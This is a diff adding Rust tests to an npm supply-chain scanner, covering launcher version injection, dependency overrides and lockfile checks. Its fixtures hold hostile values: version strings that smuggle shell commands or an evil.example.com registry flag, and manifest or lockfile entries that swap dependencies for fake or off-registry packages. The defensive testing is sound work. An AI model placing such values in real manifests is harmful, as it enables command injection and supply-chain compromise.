@@ -793,6 +793,61 @@ fn launcher_variants_keep_code014() {
     assert_code014_stays(&evald, "eval in the launcher");
 }
 
+/// Hunt finding H1: the launcher interpolates `packageJson.version` and
+/// `.name` straight into `execSync(`npm install ${name}@${version}`)`. The
+/// CODE-016 rewrite proved only that the *expressions* resolve to the
+/// manifest's own name/version, never that the resolved *values* are safe.
+/// A `version` field carrying a smuggled flag or shell metacharacter
+/// (`"1.4.0 --registry=https://evil.example.com"`), or a `name` with one, must
+/// keep CODE-014 High. npm's publish-time semver check does not protect a
+/// clone, tarball or local install, which is exactly what Sigil scans.
+#[test]
+fn launcher_with_an_injected_version_or_name_stays_code014() {
+    // The version (and every matching platform spec, which must equal it)
+    // carries a flag or a shell metacharacter.
+    for poison in [
+        "1.4.0 --registry=https://evil.example.com",
+        "1.4.0 --unsafe-perm --foreground-scripts",
+        "1.4.0;id",
+        "1.4.0 && npx acme",
+        "1.4.0|tee",
+        "1.4.0 $(id)",
+        "1.4.0`id`",
+        "latest",
+        "^1.4.0",
+        "1.4.0 ",
+    ] {
+        let manifest = LAUNCHER_MANIFEST.replace("1.4.0", poison);
+        let entries = with(microsoft_shape(), "package/package.json", &manifest);
+        assert_code014_stays(&entries, &format!("version {poison:?}"));
+    }
+    // The control: a clean semver rewrites to CODE-016 (not CODE-014 High).
+    let clean = microsoft_shape();
+    let r = scan_owned(&clean);
+    let found = rules(&r);
+    assert!(
+        found.iter().any(|(id, _)| id == "CODE-016"),
+        "clean launcher should rewrite to CODE-016: {found:?}"
+    );
+    assert!(
+        !found
+            .iter()
+            .any(|(id, s)| id == "CODE-014" && *s == Severity::High),
+        "clean launcher should not keep CODE-014 High: {found:?}"
+    );
+    // A pre-release / build semver is still a clean rewrite.
+    for ok in ["1.4.0-beta.2", "2.0.0-rc.1+build.7", "10.20.30"] {
+        let manifest = LAUNCHER_MANIFEST.replace("1.4.0", ok);
+        let entries = with(microsoft_shape(), "package/package.json", &manifest);
+        let r = scan_owned(&entries);
+        let found = rules(&r);
+        assert!(
+            found.iter().any(|(id, _)| id == "CODE-016"),
+            "semver {ok:?} should still rewrite to CODE-016: {found:?}"
+        );
+    }
+}
+
 // ---------------------------------------------------------------------------
 // INSTALL-004 build variants keep Medium
 // ---------------------------------------------------------------------------
@@ -883,11 +938,15 @@ fn a_bundled_or_redirected_build_tool_stays_medium() {
         rules(&r)
     );
     // An override for a package whose name merely contains the tool's name
-    // (io.mailtrap/mcp) is not an override of the tool.
+    // (io.mailtrap/mcp) is not an override of the tool, but it still swaps a
+    // package somewhere in the tree, and a swapped package can link a `tsc`
+    // bin once npm hoists it (Codex review of #172, finding B): the finding
+    // keeps INSTALL-004. `overrides_in` alone would have let it through.
     let unrelated = "{\n  \"name\": \"x\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"prepare\": \"tsc\"\n  },\n  \"devDependencies\": { \"typescript\": \"^5\" },\n  \"overrides\": { \"@typescript-eslint/typescript-estree\": { \"minimatch\": \"9.0.7\" } }\n}\n";
     let r = scan(&[("package.json", unrelated)]);
     assert!(
-        r.findings.iter().any(|f| f.rule == "INSTALL-012"),
+        r.findings.iter().any(|f| f.rule == "INSTALL-004")
+            && !r.findings.iter().any(|f| f.rule == "INSTALL-012"),
         "{:?}",
         rules(&r)
     );
@@ -1825,6 +1884,506 @@ fn an_install_config_that_alters_execution_keeps_the_original_finding() {
             &[("package.json", prepare()), (name, body.to_string())],
             true,
             &format!("benign {name}"),
+        );
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Overrides, package extensions and lockfiles below a trusted tool
+// (Codex review of #172, finding B)
+// ---------------------------------------------------------------------------
+
+/// The Codex shape: `prepare: "rimraf dist"` with `rimraf` a registry
+/// devDependency, which INSTALL-012 would rewrite to Low.
+const RIMRAF_PREPARE: &str = r#""prepare": "rimraf dist""#;
+const RIMRAF_DEV: &str = r#", "devDependencies": { "rimraf": "^5.0.0" }"#;
+
+fn rimraf_prepare(extra: &str) -> String {
+    pkg(RIMRAF_PREPARE, &format!("{RIMRAF_DEV}{extra}"))
+}
+
+/// A registry-only npm lockfile for rimraf and one of its dependencies.
+const CLEAN_NPM_LOCK: &str = r#"{"name":"x","version":"1.0.0","lockfileVersion":3,"requires":true,"packages":{"":{"name":"x","version":"1.0.0","devDependencies":{"rimraf":"^5.0.0"}},"node_modules/rimraf":{"version":"5.0.10","resolved":"https://registry.npmjs.org/rimraf/-/rimraf-5.0.10.tgz","integrity":"sha512-AAAA","dev":true,"dependencies":{"glob":"^10.3.7"},"bin":{"rimraf":"dist/esm/bin.mjs"}},"node_modules/glob":{"version":"10.4.5","resolved":"https://registry.npmjs.org/glob/-/glob-10.4.5.tgz","integrity":"sha512-BBBB","dev":true},"node_modules/@isaacs/cliui":{"version":"8.0.2","resolved":"https://registry.npmjs.org/@isaacs/cliui/-/cliui-8.0.2.tgz","integrity":"sha512-CCCC","dev":true}}}"#;
+
+/// Every override / resolution / pnpm field that can swap or add a package
+/// below rimraf keeps INSTALL-004 Medium, including the Codex example (an
+/// override of one of rimraf's own dependencies with a package that exports
+/// a `rimraf` bin). The tool's own name appears in none of them, which is
+/// what `overrides_in` checked.
+#[test]
+fn an_override_of_a_transitive_dependency_keeps_install004() {
+    // Control: the plain shape is rewritten.
+    assert_prepare(&[("package.json", rimraf_prepare(""))], true, "control");
+    for extra in [
+        // Codex: replace one of rimraf's dependencies with an attacker package.
+        r#", "overrides": { "glob": "npm:fake-glob-with-rimraf-bin@1.0.0" }"#,
+        r#", "overrides": { "glob": "github:example/glob" }"#,
+        r#", "overrides": { "minimatch": "9.0.7" }"#,
+        r#", "overrides": { "@isaacs/cliui": { "string-width": "npm:fake-sw@1.0.0" } }"#,
+        r#", "overrides": { "foo@1": { ".": "2.0.0" } }"#,
+        r#", "resolutions": { "**/glob": "https://registry.example.invalid/glob.tgz" }"#,
+        r#", "resolutions": { "glob": "patch:glob@npm:10.4.5#./fake.patch" }"#,
+        r#", "resolutions": { "jackspeak": "1.0.0" }"#,
+        r#", "pnpm": { "overrides": { "glob": "link:./vendor/glob" } }"#,
+        r#", "pnpm": { "overrides": { "rimraf>glob": "npm:fake-glob@1.0.0" } }"#,
+        // Add a dependency to rimraf's (or glob's) own manifest.
+        r#", "pnpm": { "packageExtensions": { "glob@*": { "dependencies": { "fake-bin-pkg": "1.0.0" } } } }"#,
+        r#", "pnpm": { "patchedDependencies": { "glob@10.4.5": "patches/glob.patch" } }"#,
+        // A field of the wrong type fails closed.
+        r#", "overrides": "glob@npm:fake-glob@1.0.0""#,
+        r#", "resolutions": ["glob"]"#,
+        r#", "pnpm": "overrides""#,
+    ] {
+        assert_prepare(
+            &[("package.json", rimraf_prepare(extra))],
+            false,
+            &format!("rimraf prepare with {extra}"),
+        );
+    }
+    // Empty blocks and unrelated pnpm settings change nothing.
+    for extra in [
+        r#", "overrides": {}"#,
+        r#", "resolutions": {}"#,
+        r#", "pnpm": { "overrides": {}, "packageExtensions": {} }"#,
+        r#", "pnpm": { "onlyBuiltDependencies": ["esbuild"] }"#,
+    ] {
+        assert_prepare(
+            &[("package.json", rimraf_prepare(extra))],
+            true,
+            &format!("rimraf prepare with {extra}"),
+        );
+    }
+}
+
+/// The same holds for every rewrite and wherever the declaration sits: the
+/// guard (INSTALL-011) and the inert postinstall (INSTALL-010) keep
+/// INSTALL-003 Critical; a workspace root's or member's override applies to
+/// the whole workspace; a parent project's `package.json` (no `workspaces`)
+/// holds the overrides of an install run from there.
+#[test]
+fn an_override_anywhere_in_scope_keeps_every_rewrite() {
+    let over = r#", "overrides": { "glob": "npm:fake-glob@1.0.0" }"#;
+    assert_install_key(
+        &[(
+            "package.json",
+            pkg(r#""preinstall": "npx only-allow pnpm""#, over),
+        )],
+        None,
+        "only-allow with an override",
+    );
+    assert_install_key(
+        &[
+            ("package.json", pkg(r#""postinstall": "node ./s.js""#, over)),
+            ("s.js", "console.log(process.platform)\n".to_string()),
+        ],
+        None,
+        "inert postinstall with an override",
+    );
+    let ext = r#", "pnpm": { "packageExtensions": { "only-allow@*": { "dependencies": { "fake-bin-pkg": "1.0.0" } } } }"#;
+    assert_install_key(
+        &[(
+            "package.json",
+            pkg(r#""preinstall": "npx only-allow pnpm""#, ext),
+        )],
+        None,
+        "only-allow with a package extension",
+    );
+    // Controls: without the override both are rewritten.
+    assert_install_key(
+        &[(
+            "package.json",
+            pkg(r#""preinstall": "npx only-allow pnpm""#, ""),
+        )],
+        Some("INSTALL-011"),
+        "only-allow control",
+    );
+    assert_install_key(
+        &[
+            ("package.json", pkg(r#""postinstall": "node ./s.js""#, "")),
+            ("s.js", "console.log(process.platform)\n".to_string()),
+        ],
+        Some("INSTALL-010"),
+        "inert postinstall control",
+    );
+
+    // Workspaces: the member's prepare, the root's override; and the root's
+    // prepare, a member's override.
+    let root = |scripts: &str, extra: &str| {
+        pkg(
+            scripts,
+            &format!(r#", "workspaces": ["packages/*"]{extra}"#),
+        )
+    };
+    let member =
+        |extra: &str| format!("{{\n  \"name\": \"h\",\n  \"version\": \"1.0.0\"{extra}\n}}\n");
+    assert_prepare(
+        &[
+            ("package.json", root("", over)),
+            ("packages/h/package.json", pkg(RIMRAF_PREPARE, RIMRAF_DEV)),
+        ],
+        false,
+        "member prepare, root override",
+    );
+    assert_prepare(
+        &[
+            ("package.json", root(RIMRAF_PREPARE, RIMRAF_DEV)),
+            ("packages/h/package.json", member(over)),
+        ],
+        false,
+        "root prepare, member override",
+    );
+    assert_prepare(
+        &[
+            ("package.json", root(RIMRAF_PREPARE, RIMRAF_DEV)),
+            ("packages/h/package.json", member("")),
+        ],
+        true,
+        "workspace control",
+    );
+    // A parent project that is not a workspace.
+    assert_prepare(
+        &[
+            ("app/package.json", pkg(RIMRAF_PREPARE, RIMRAF_DEV)),
+            ("package.json", pkg("", over)),
+        ],
+        false,
+        "parent package.json override",
+    );
+    assert_prepare(
+        &[
+            ("app/package.json", pkg(RIMRAF_PREPARE, RIMRAF_DEV)),
+            ("package.json", pkg("", "")),
+        ],
+        true,
+        "parent package.json control",
+    );
+}
+
+/// pnpm reads overrides, package extensions and patches from
+/// `pnpm-workspace.yaml` too, and yarn reads package extensions from
+/// `.yarnrc.yml`.
+#[test]
+fn a_workspace_or_yarn_config_override_keeps_install004() {
+    let plain = || rimraf_prepare("");
+    for (name, body) in [
+        (
+            "pnpm-workspace.yaml",
+            "packages:\n  - 'packages/*'\noverrides:\n  glob: npm:fake-glob@1.0.0\n",
+        ),
+        (
+            "pnpm-workspace.yaml",
+            "overrides:\n  \"rimraf>glob\": link:./vendor/glob\n",
+        ),
+        (
+            "pnpm-workspace.yaml",
+            "packageExtensions:\n  glob@*:\n    dependencies:\n      fake-bin-pkg: 1.0.0\n",
+        ),
+        (
+            "pnpm-workspace.yaml",
+            "patchedDependencies:\n  glob@10.4.5: patches/glob.patch\n",
+        ),
+        (
+            "pnpm-workspace.yaml",
+            "configDependencies:\n  fake-config: 1.0.0+sha512-AAAA\n",
+        ),
+        ("pnpm-workspace.yaml", "pnpmfile: ./hooks.cjs\n"),
+        // Does not parse.
+        ("pnpm-workspace.yaml", "overrides: [glob\n  : {\n"),
+        ("pnpm-workspace.yaml", "- packages/*\n"),
+        (
+            ".yarnrc.yml",
+            "packageExtensions:\n  \"glob@*\":\n    dependencies:\n      fake-bin-pkg: 1.0.0\n",
+        ),
+    ] {
+        assert_prepare(
+            &[("package.json", plain()), (name, body.to_string())],
+            false,
+            &format!("{name}: {}", body.trim()),
+        );
+    }
+    // A pnpm-workspace.yaml with only a packages list (or nothing) does not.
+    for body in [
+        "packages:\n  - 'packages/*'\n",
+        "",
+        "onlyBuiltDependencies:\n  - esbuild\n",
+    ] {
+        assert_prepare(
+            &[
+                ("package.json", plain()),
+                ("pnpm-workspace.yaml", body.to_string()),
+            ],
+            true,
+            &format!("benign pnpm-workspace.yaml {body:?}"),
+        );
+    }
+}
+
+/// Any lockfile entry off the public registry, under any name, keeps
+/// INSTALL-004: a lockfile decides what `npm ci`, `yarn install
+/// --frozen-lockfile` and `pnpm install` fetch for every package in the tree,
+/// not only the tool. So does a lockfile that does not parse.
+#[test]
+fn a_lockfile_entry_off_the_registry_keeps_install004() {
+    let plain = || rimraf_prepare("");
+    let off_npm: &[(&str, &str)] = &[
+        // A transitive dependency fetched from another host.
+        (
+            "package-lock.json",
+            r#"{"lockfileVersion":3,"packages":{"":{},"node_modules/rimraf":{"version":"5.0.10","resolved":"https://registry.npmjs.org/rimraf/-/rimraf-5.0.10.tgz"},"node_modules/glob":{"version":"10.4.5","resolved":"https://registry.example.invalid/glob/-/glob-10.4.5.tgz"}}}"#,
+        ),
+        // From git.
+        (
+            "package-lock.json",
+            r#"{"lockfileVersion":3,"packages":{"node_modules/glob":{"version":"10.4.5","resolved":"git+ssh://git@github.com/example/glob.git#0123456789abcdef"}}}"#,
+        ),
+        // Another package's tarball on the public registry (an alias).
+        (
+            "package-lock.json",
+            r#"{"lockfileVersion":3,"packages":{"node_modules/glob":{"version":"1.0.0","resolved":"https://registry.npmjs.org/fake-glob/-/fake-glob-1.0.0.tgz"}}}"#,
+        ),
+        (
+            "package-lock.json",
+            r#"{"lockfileVersion":3,"packages":{"node_modules/glob":{"name":"fake-glob","version":"1.0.0","resolved":"https://registry.npmjs.org/fake-glob/-/fake-glob-1.0.0.tgz"}}}"#,
+        ),
+        // A link to a directory, and that directory's own entry.
+        (
+            "package-lock.json",
+            r#"{"lockfileVersion":3,"packages":{"node_modules/glob":{"resolved":"vendor/glob","link":true}}}"#,
+        ),
+        (
+            "package-lock.json",
+            r#"{"lockfileVersion":3,"packages":{"vendor/glob":{"name":"glob","version":"10.4.5"}}}"#,
+        ),
+        // Lockfile v1: a file: spec, and a nested off-registry dependency.
+        (
+            "package-lock.json",
+            r#"{"lockfileVersion":1,"dependencies":{"glob":{"version":"file:vendor/glob"}}}"#,
+        ),
+        (
+            "package-lock.json",
+            r#"{"lockfileVersion":1,"dependencies":{"rimraf":{"version":"5.0.10","resolved":"https://registry.npmjs.org/rimraf/-/rimraf-5.0.10.tgz","dependencies":{"glob":{"version":"10.4.5","resolved":"https://registry.example.invalid/glob-10.4.5.tgz"}}}}}"#,
+        ),
+        (
+            "package-lock.json",
+            r#"{"lockfileVersion":1,"dependencies":{"glob":{"version":"npm:fake-glob@1.0.0","resolved":"https://registry.npmjs.org/fake-glob/-/fake-glob-1.0.0.tgz"}}}"#,
+        ),
+        // Does not parse, or not an object.
+        ("package-lock.json", "{\"lockfileVersion\":3,"),
+        ("package-lock.json", "[]"),
+        (
+            "npm-shrinkwrap.json",
+            r#"{"lockfileVersion":3,"packages":{"node_modules/glob":{"version":"10.4.5","resolved":"https://registry.example.invalid/glob-10.4.5.tgz"}}}"#,
+        ),
+    ];
+    for (name, body) in off_npm {
+        assert_prepare(
+            &[("package.json", plain()), (name, body.to_string())],
+            false,
+            &format!("{name}: {body}"),
+        );
+    }
+    let off_yarn = [
+        // Classic: a transitive dependency from another host, from git, an
+        // alias, and lines this pass does not know.
+        "# yarn lockfile v1\n\nrimraf@^5.0.0:\n  version \"5.0.10\"\n  resolved \"https://registry.yarnpkg.com/rimraf/-/rimraf-5.0.10.tgz#abc\"\n  dependencies:\n    glob \"^10.3.7\"\n\nglob@^10.3.7:\n  version \"10.4.5\"\n  resolved \"https://registry.example.invalid/glob/-/glob-10.4.5.tgz#abc\"\n",
+        "# yarn lockfile v1\n\n\"glob@github:example/glob\":\n  version \"10.4.5\"\n  resolved \"https://codeload.github.com/example/glob/tar.gz/0123456\"\n",
+        "# yarn lockfile v1\n\n\"glob@npm:fake-glob@^1.0.0\":\n  version \"1.0.0\"\n  resolved \"https://registry.yarnpkg.com/fake-glob/-/fake-glob-1.0.0.tgz#abc\"\n",
+        "# yarn lockfile v1\n\nglob@^10.3.7:\n  version \"10.4.5\"\n  resolved \"https://registry.yarnpkg.com/fake-glob/-/fake-glob-1.0.0.tgz#abc\"\n",
+        "# yarn lockfile v1\n\nglob@^10.3.7:\n  version \"10.4.5\"\n  preinstall \"x\"\n",
+        "not a lockfile at all",
+        // Berry: a URL resolution, an alias, a link, and a patch of a file.
+        "__metadata:\n  version: 8\n\n\"glob@npm:^10.3.7\":\n  version: 10.4.5\n  resolution: \"glob@https://registry.example.invalid/glob.tgz\"\n  linkType: hard\n",
+        "__metadata:\n  version: 8\n\n\"glob@npm:fake-glob@^1.0.0\":\n  version: 1.0.0\n  resolution: \"fake-glob@npm:1.0.0\"\n  linkType: hard\n",
+        "__metadata:\n  version: 8\n\n\"glob@link:./vendor/glob\":\n  version: 0.0.0-use.local\n  resolution: \"glob@link:./vendor/glob::locator=x%40workspace%3A.\"\n  linkType: soft\n",
+        "__metadata:\n  version: 8\n\n\"glob@patch:glob@npm%3A10.4.5#./fake.patch\":\n  version: 10.4.5\n  resolution: \"glob@patch:glob@npm%3A10.4.5#./fake.patch::version=10.4.5&hash=abc\"\n  linkType: hard\n",
+        "__metadata:\n  version: 8\n\n\"glob@npm:^10.3.7\": [\n",
+    ];
+    for body in off_yarn {
+        assert_prepare(
+            &[("package.json", plain()), ("yarn.lock", body.to_string())],
+            false,
+            &format!("yarn.lock: {body}"),
+        );
+    }
+    let off_pnpm = [
+        "lockfileVersion: '9.0'\npackages:\n  glob@10.4.5:\n    resolution: {tarball: https://registry.example.invalid/glob-10.4.5.tgz}\n",
+        "lockfileVersion: '9.0'\npackages:\n  glob@https://codeload.github.com/example/glob/tar.gz/0123456:\n    resolution: {tarball: https://codeload.github.com/example/glob/tar.gz/0123456}\n",
+        "lockfileVersion: '9.0'\npackages:\n  glob@10.4.5:\n    resolution: {type: git, repo: https://github.com/example/glob, commit: 0123456}\n",
+        "lockfileVersion: '9.0'\npackages:\n  glob@10.4.5:\n    resolution: {directory: vendor/glob, type: directory}\n",
+        "lockfileVersion: '9.0'\noverrides:\n  glob: npm:fake-glob@1.0.0\n",
+        "lockfileVersion: '9.0'\npackageExtensionsChecksum: sha256-AAAA\n",
+        "lockfileVersion: '9.0'\npatchedDependencies:\n  glob@10.4.5:\n    hash: abc\n    path: patches/glob.patch\n",
+        "lockfileVersion: '9.0'\nimporters:\n  .:\n    devDependencies:\n      rimraf:\n        specifier: ^5.0.0\n        version: 5.0.10\n      glob:\n        specifier: link:vendor/glob\n        version: link:vendor/glob\n",
+        "lockfileVersion: '9.0'\nsnapshots:\n  rimraf@5.0.10:\n    dependencies:\n      glob: fake-glob@1.0.0\n",
+        "lockfileVersion: '9.0'\nsnapshots:\n  glob@10.4.5(patch_hash=abc):\n    dependencies: {}\n",
+        "lockfileVersion: '6.0'\ndevDependencies:\n  rimraf:\n    specifier: ^5.0.0\n    version: /fake-rimraf@5.0.10\n",
+        "packages:\n  glob@10.4.5:\n    resolution: {integrity: sha512-AAAA}\n",
+        "lockfileVersion: '9.0'\npackages: [\n",
+    ];
+    for body in off_pnpm {
+        assert_prepare(
+            &[
+                ("package.json", plain()),
+                ("pnpm-lock.yaml", body.to_string()),
+            ],
+            false,
+            &format!("pnpm-lock.yaml: {body}"),
+        );
+    }
+    // A bun lockfile is not read, so it always counts.
+    for name in ["bun.lock", "bun.lockb"] {
+        assert_prepare(
+            &[("package.json", plain()), (name, "{}".to_string())],
+            false,
+            name,
+        );
+    }
+    // The guard and the inert postinstall fail closed the same way.
+    let lock = off_npm[0].1.to_string();
+    assert_install_key(
+        &[
+            (
+                "package.json",
+                pkg(r#""preinstall": "npx only-allow pnpm""#, ""),
+            ),
+            ("package-lock.json", lock.clone()),
+        ],
+        None,
+        "only-allow with an off-registry lockfile",
+    );
+    assert_install_key(
+        &[
+            ("package.json", pkg(r#""postinstall": "node ./s.js""#, "")),
+            ("s.js", "console.log(process.platform)\n".to_string()),
+            ("package-lock.json", lock.clone()),
+        ],
+        None,
+        "inert postinstall with an off-registry lockfile",
+    );
+    // A lockfile at a workspace root, in a member, or above the package.
+    let root = pkg("", r#", "workspaces": ["packages/*"]"#);
+    assert_prepare(
+        &[
+            ("package.json", root.clone()),
+            ("packages/h/package.json", pkg(RIMRAF_PREPARE, RIMRAF_DEV)),
+            ("package-lock.json", lock.clone()),
+        ],
+        false,
+        "member prepare, root lockfile",
+    );
+    assert_prepare(
+        &[
+            (
+                "package.json",
+                pkg(
+                    RIMRAF_PREPARE,
+                    &format!(r#"{RIMRAF_DEV}, "workspaces": ["packages/*"]"#),
+                ),
+            ),
+            ("packages/h/package.json", pkg("", "")),
+            ("packages/h/yarn.lock", off_yarn[0].to_string()),
+        ],
+        false,
+        "root prepare, member lockfile",
+    );
+    assert_prepare(
+        &[
+            ("app/package.json", pkg(RIMRAF_PREPARE, RIMRAF_DEV)),
+            ("pnpm-lock.yaml", off_pnpm[0].to_string()),
+        ],
+        false,
+        "lockfile above the package",
+    );
+}
+
+/// Package-manager files are read straight from disk, so one that is not a
+/// regular file must neither block the scan nor pass: a lockfile, `.npmrc`
+/// or parent `package.json` that is a directory or a link to a device keeps
+/// the original finding, and the scan returns.
+#[test]
+fn an_unreadable_install_file_keeps_install004() {
+    for name in [
+        "package-lock.json",
+        "yarn.lock",
+        "pnpm-lock.yaml",
+        "pnpm-workspace.yaml",
+        ".npmrc",
+    ] {
+        let dir = tempfile::tempdir().unwrap();
+        write_tree(dir.path(), &[("package.json", &rimraf_prepare(""))]);
+        fs::create_dir_all(dir.path().join(name).join("x")).unwrap();
+        let r = run_scan(dir.path(), None, None);
+        let found = rules(&r);
+        assert!(
+            found.iter().any(|(id, _)| id == "INSTALL-004")
+                && !found.iter().any(|(id, _)| id == "INSTALL-012"),
+            "{name} as a directory: {found:?}"
+        );
+    }
+    #[cfg(unix)]
+    for name in ["package-lock.json", ".npmrc", "yarn.lock"] {
+        // A link to an endless device: reading it would never return.
+        let dir = tempfile::tempdir().unwrap();
+        write_tree(dir.path(), &[("app/package.json", &rimraf_prepare(""))]);
+        std::os::unix::fs::symlink("/dev/zero", dir.path().join(name)).unwrap();
+        let r = run_scan(dir.path(), None, None);
+        let found = rules(&r);
+        assert!(
+            found.iter().any(|(id, _)| id == "INSTALL-004")
+                && !found.iter().any(|(id, _)| id == "INSTALL-012"),
+            "{name} linked to /dev/zero: {found:?}"
+        );
+    }
+    #[cfg(unix)]
+    {
+        // A parent package.json that is a link to a device.
+        let dir = tempfile::tempdir().unwrap();
+        write_tree(dir.path(), &[("app/package.json", &rimraf_prepare(""))]);
+        std::os::unix::fs::symlink("/dev/zero", dir.path().join("package.json")).unwrap();
+        let r = run_scan(dir.path(), None, None);
+        assert!(
+            !rules(&r).iter().any(|(id, _)| id == "INSTALL-012"),
+            "parent package.json linked to /dev/zero: {:?}",
+            rules(&r)
+        );
+    }
+}
+
+/// Lockfiles whose every entry is a public-registry package under its own
+/// name leave the rewrite in place, in each format.
+#[test]
+fn a_registry_only_lockfile_keeps_the_rewrite() {
+    let plain = || rimraf_prepare("");
+    let clean: &[(&str, &str)] = &[
+        ("package-lock.json", CLEAN_NPM_LOCK),
+        ("npm-shrinkwrap.json", CLEAN_NPM_LOCK),
+        // v1, with a nested and a bundled dependency.
+        (
+            "package-lock.json",
+            r#"{"lockfileVersion":1,"dependencies":{"rimraf":{"version":"5.0.10","resolved":"https://registry.npmjs.org/rimraf/-/rimraf-5.0.10.tgz","dependencies":{"glob":{"version":"10.4.5","resolved":"https://registry.npmjs.org/glob/-/glob-10.4.5.tgz"},"ansi-regex":{"version":"6.0.1","bundled":true}}}}}"#,
+        ),
+        (
+            "yarn.lock",
+            "# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.\n# yarn lockfile v1\n\n\n\"@isaacs/cliui@^8.0.2\":\n  version \"8.0.2\"\n  resolved \"https://registry.yarnpkg.com/@isaacs/cliui/-/cliui-8.0.2.tgz#b37667b7bc181c168782259bab42474fbf52b550\"\n  integrity sha512-AAAA\n  dependencies:\n    string-width \"^5.1.2\"\n\nglob@^10.3.7, glob@^10.4.1:\n  version \"10.4.5\"\n  resolved \"https://registry.npmjs.org/glob/-/glob-10.4.5.tgz#abc\"\n  integrity sha512-BBBB\n\nrimraf@^5.0.0:\n  version \"5.0.10\"\n  resolved \"https://registry.yarnpkg.com/rimraf/-/rimraf-5.0.10.tgz#abc\"\n  integrity sha512-CCCC\n  dependencies:\n    glob \"^10.3.7\"\n",
+        ),
+        (
+            "yarn.lock",
+            "# This file is generated by running \"yarn install\" inside your project.\n\n__metadata:\n  version: 8\n  cacheKey: 10c0\n\n\"glob@npm:^10.3.7\":\n  version: 10.4.5\n  resolution: \"glob@npm:10.4.5\"\n  checksum: 10c0/abc\n  languageName: node\n  linkType: hard\n\n\"rimraf@npm:^5.0.0\":\n  version: 5.0.10\n  resolution: \"rimraf@npm:5.0.10\"\n  dependencies:\n    glob: \"npm:^10.3.7\"\n  bin:\n    rimraf: dist/esm/bin.mjs\n  checksum: 10c0/def\n  languageName: node\n  linkType: hard\n\n\"typescript@patch:typescript@npm%3A^5#optional!builtin<compat/typescript>\":\n  version: 5.9.3\n  resolution: \"typescript@patch:typescript@npm%3A5.9.3#optional!builtin<compat/typescript>::version=5.9.3&hash=5786d5\"\n  languageName: node\n  linkType: hard\n\n\"x@workspace:.\":\n  version: 0.0.0-use.local\n  resolution: \"x@workspace:.\"\n  dependencies:\n    rimraf: \"npm:^5.0.0\"\n  languageName: unknown\n  linkType: soft\n",
+        ),
+        (
+            "pnpm-lock.yaml",
+            "lockfileVersion: '9.0'\n\nsettings:\n  autoInstallPeers: true\n  excludeLinksFromLockfile: false\n\nimporters:\n\n  .:\n    devDependencies:\n      rimraf:\n        specifier: ^5.0.0\n        version: 5.0.10\n\npackages:\n\n  '@isaacs/cliui@8.0.2':\n    resolution: {integrity: sha512-AAAA}\n    engines: {node: '>=12'}\n\n  glob@10.4.5:\n    resolution: {integrity: sha512-BBBB}\n    hasBin: true\n\n  rimraf@5.0.10:\n    resolution: {integrity: sha512-CCCC}\n    hasBin: true\n\nsnapshots:\n\n  '@isaacs/cliui@8.0.2': {}\n\n  glob@10.4.5:\n    dependencies:\n      '@isaacs/cliui': 8.0.2\n\n  rimraf@5.0.10:\n    dependencies:\n      glob: 10.4.5\n",
+        ),
+        (
+            "pnpm-lock.yaml",
+            "lockfileVersion: '6.0'\n\ndevDependencies:\n  rimraf:\n    specifier: ^5.0.0\n    version: 5.0.10\n\npackages:\n\n  /glob@10.4.5:\n    resolution: {integrity: sha512-BBBB}\n    dependencies:\n      '@isaacs/cliui': 8.0.2(react@18.2.0)\n    dev: true\n\n  /rimraf@5.0.10:\n    resolution: {integrity: sha512-CCCC}\n    hasBin: true\n    dependencies:\n      glob: 10.4.5\n    dev: true\n",
+        ),
+    ];
+    for (name, body) in clean {
+        assert_prepare(
+            &[("package.json", plain()), (name, body.to_string())],
+            true,
+            &format!("clean {name}: {body}"),
         );
     }
 }
